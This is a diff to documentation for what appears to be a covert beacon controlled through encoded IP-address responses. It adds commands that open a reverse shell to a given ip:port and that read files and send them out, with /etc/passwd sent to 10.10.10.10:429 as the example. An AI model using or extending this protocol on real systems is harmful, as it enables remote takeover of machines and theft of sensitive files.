@@ -26,12 +26,23 @@ x.x.x.100 - Standby / Sleep
 x.x.x.232 - Prepare for reverse shell
 x.x.x.85 - Collect file contents
 
+
 Response Formats:
 
 Response A - Single IP from standard responses
 Response B - Responds with 2 addresses:
-	IP address to send reverse shell to (ie. 10.10.10.10)
+	IP address to send reverse shell/data to (ie. 10.10.10.10)
 	IP address of format y1.y2.x.3, where the port to transmit on is defined as y1+y2 *Note: port capped at 510*
 Response C - Responds with any number of addresses:
 	Each quartet of the address is translated into it's ascii character until the value "3" is reached
 	Designates a filename
+	
+
+Beacon Commands: *Found in the beacon's file located on the server. CAUTION: Do not edit the beacon file directly unless you know exactly what you're doing. Errors can cause the beacon to crash*
+
+"shell" - Reverse shell
+	- Next line will contain ip:port to send the shell to, ie. 10.10.10.10:429
+"file" - Collect file contents
+	- Next lines will be filename first, ip:port to send to second. Example:
+		/etc/passwd
+		10.10.10.10:429
